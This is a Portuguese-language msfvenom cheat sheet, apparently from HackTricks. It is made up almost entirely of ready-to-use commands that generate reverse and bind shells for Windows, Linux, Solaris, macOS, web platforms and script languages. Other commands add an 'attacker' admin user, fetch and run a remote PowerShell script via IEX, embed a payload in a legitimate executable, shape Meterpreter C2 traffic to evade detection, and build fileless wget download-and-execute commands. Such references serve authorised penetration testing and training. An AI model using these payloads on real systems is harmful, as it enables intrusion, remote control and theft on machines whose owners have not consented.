# MSFVenom - CheatSheet

{{#include ../../banners/hacktricks-training.md}}

---

## msfvenom básico

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Use `-a` para selecionar a arquitetura do payload e `--platform` para selecionar sua plataforma-alvo.<sup>[[1]](#references)</sup>

## Listagem
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
Esses comandos listam os módulos de payload e encoder disponíveis no framework instalado.<sup>[[1]](#references)</sup>

## Parâmetros comuns ao criar um shellcode
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
As flags mostradas aqui selecionam caracteres proibidos, formato de saída, encoder e iterações de encoding.<sup>[[1]](#references)</sup>

## Modelagem de tráfego HTTP(S) do Meterpreter

O Metasploit 6.5 adicionou a opção `MALLEABLEC2` aos payloads staged e stageless de reverse HTTP(S) Meterpreter. O profile pode alterar URIs, user agents, headers de requisição/resposta, posicionamento do connection-ID e encodings/wrappers de body compatíveis. Tanto o payload gerado quanto o handler devem carregar o **mesmo profile local**. A requisição inicial de um payload staged para o stage do Meterpreter não é moldada; portanto, prefira um payload stageless, como `windows/x64/meterpreter_reverse_https`, quando a primeira requisição também precisar corresponder ao profile.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
Configure o handler correspondente com o payload e o profile idênticos:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Only as diretivas documentadas como implementadas afetam o tráfego; blocos de perfil não suportados podem ser analisados com sucesso, mas não ter efeito.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Criar Usuário
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Executar comando**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Encoding não é evasão de AV:** encoders como `x86/shikata_ga_nai` são úteis principalmente para atender às restrições de bad characters. A codificação repetida não é uma técnica confiável de evasão de AV.<sup>[[1]](#references)</sup>

### Embutido dentro do executável
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Payloads Linux

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **Payloads para Mac**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Payloads baseados na Web**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Payloads de linguagem de script**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Fetch payloads produzem um comando que faz com que um utilitário disponível no alvo baixe e execute um payload nativo subjacente. Seus nomes seguem `cmd/<platform>/<fetch-protocol>/<served-payload>`; adaptadores HTTP(S), SMB e TFTP estão disponíveis, com opções de download que dependem da plataforma-alvo.<sup>[[2]](#references)</sup>

Por exemplo, gere um comando Linux `wget` que obtenha um payload Meterpreter x64 da porta 8080 e faça a conexão de retorno pela porta 4444:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
Inicie o **fetch handler** com as mesmas configurações; ele hospeda o ELF gerado e também inicia o handler para o payload Meterpreter servido:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Opções dependentes úteis incluem `FETCH_PIPE=true` para gerar um comando HTTP(S) mais curto quando compatível e `FETCH_FILELESS=shell`, `shell-search` ou `python3.8+` para executar um Linux ELF a partir de um file descriptor anônimo. Os modos fileless exigem Linux kernel 3.17 ou posterior; inspecione o adapter exato com `msfvenom -p <FETCH_PAYLOAD> --list-options`, pois as combinações compatíveis variam.<sup>[[2]](#references)</sup>



## References

- [1] [Como usar o msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Como usar Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Perfis Malleable C2](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
